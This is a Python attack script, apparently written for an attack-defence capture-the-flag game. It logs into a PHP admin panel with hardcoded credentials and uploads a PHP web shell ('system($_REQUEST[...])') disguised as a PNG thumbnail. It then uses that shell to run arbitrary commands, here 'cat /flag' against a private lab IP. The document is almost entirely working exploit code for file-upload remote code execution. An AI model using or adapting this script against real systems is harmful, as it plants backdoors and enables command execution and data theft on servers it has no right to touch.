#!/usr/bin/env python

import requests,re
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
from random import randint

def vulnerable_attack(target,target_port,cmd):
		
	'''
	this is the payload script for vuln:

	echo file_get_contents($_POST[444]);

	'''

	try:
		data = cmd 
		#res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
		res = attack(target,target_port,data)
		# Even though we can not execute the cmd with the vuln, but we can read flag
		# and we want to use our framework to carry out this attack
		# not do the replicate tasks to code a new script
	except Exception,e:
		debug_print(traceback.format_exc())     
		dump_error("attack failed",target,"vulnerable attack")
		res = "error"

	return res


import requests
import hashlib 
import time
import re
import os




def attack(ip,port,cmd):

	### config ####
	pattern = 'name=\"([0-9a-f]{32})'
	admin_id = '476'

	################

	my_socket = ip + ':' + str(port)
	my_time_hash = '_' + hashlib.md5('xxxx' + str(ip) + str(port) + str(time.time())).hexdigest()
	# my_time_hash = '_' + hashlib.md5('xxxx' + str(ip) + str(port) + str(666)).hexdigest()

	my_shell = "<?php system($_REQUEST['%s']);?>" %(my_time_hash)


	print 'my hash => ' + my_time_hash


	data = {
		'user': 'admin',
		'passwd': 'dsakdjfh22adsjk3'
	}
	s = requests.Session()
	url = 'http://%s/admin/index.php/login/slogin' % ip
	r = s.post(url, data, timeout=2)
	if '/admin/index.php/index/index' in r.content:
		print('login success')
	else:
		print('login fail')
		



	
	url = 'http://%s/admin/index.php/article/upload' % ip
	multiple_files = [('thumb', ('x.php', my_shell, 'image/png'))]
	r = s.post(url, files=multiple_files,timeout=2)

	
	url_2 = re.findall("content.thumb.value='(.*)';</script>",r.content)[0]
	
	
	url_2 = 'http://%s/'%ip + url_2
	# execute cmd
	data = {my_time_hash:cmd}
	response = requests.post(url_2,data=data,timeout=2)
	print("Status code:   %i" % response.status_code)
	print response.content

	return response.content







if __name__ == '__main__':
	attack('172.16.44.172','80','cat /flag')
